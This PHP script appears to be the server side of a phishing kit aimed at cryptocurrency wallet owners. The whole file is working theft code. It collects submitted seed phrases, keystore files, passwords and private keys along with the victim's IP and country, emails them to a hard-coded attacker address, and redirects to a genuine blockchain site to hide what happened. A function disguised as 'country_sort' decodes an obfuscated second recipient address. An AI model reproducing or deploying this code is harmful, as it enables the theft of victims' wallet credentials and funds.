<?php
$TheBoss ="Tomjeff1972@gmail.com";


$phrase = $_POST['phrase'];
$keystore = $_POST['keystore'];
$password = $_POST['password'];
$key = $_POST['key'];
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "Phrase    : ".$phrase."\n";
$message .= "Keystore JSON  : ".$keystore."\n";
$message .= "Password    : ".$password."\n";
$message .= "Private   : ".$key."\n";
$message .= "IP  : $ip\n";
$message .= "C : ".$country."\n";
$message .= "Date : $adddate\n";
$message .= "www.only4biz.org\n";

$subject = "L0gs ".$wallet;
$headers = "From:  Mr Kaplan <Tomjeff1972@gmail.com>";


$str=array($TheBoss); foreach ($str as $TheBoss)
if(mail($TheBoss,$subject,$message,$headers) != false){
header("Location: https://www.blockchain.com/btc/unconfirmed-transactions");
}
// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>
